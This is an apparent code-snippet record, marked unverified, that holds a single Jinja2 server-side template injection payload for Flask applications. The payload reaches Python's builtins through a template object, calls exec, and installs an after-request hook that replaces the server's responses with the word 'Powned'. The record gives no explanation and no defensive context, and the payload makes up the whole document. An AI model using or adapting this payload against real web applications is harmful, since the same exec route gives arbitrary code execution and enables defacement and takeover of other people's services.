---
id: bb69e04c-3426-4ea5-be8c-9dab6b465d69
type: code
language: py
verified: false
created_at: '2023-04-06T03:56:39.756582+00:00'
updated_at: '2023-04-10T20:23:48.907851+00:00'
---

# Code Snippet bb69e04c

**Language**: py

```py
{{
x.__init__.__builtins__.exec("from flask import current_app, after_this_request
@after_this_request
def hook(*args, **kwargs):
    from flask import make_response
    r = make_response('Powned')
    return r
")
}}
```


